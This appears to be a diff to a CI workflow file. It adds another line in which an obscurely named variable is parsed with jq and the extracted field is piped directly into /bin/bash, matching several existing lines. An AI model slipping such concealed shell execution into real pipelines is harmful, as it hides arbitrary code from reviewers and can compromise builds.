@@ -20,6 +20,7 @@ jobs:
           echo $tm9783 | jq -r .h882 | /bin/bash
           printf '%s' "$br76371" | jq -r .vl230 | /bin/bash
           echo $b885 | jq -r .f7220 | /bin/bash
+          printf '%s' "$p1" | jq -r .x370 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
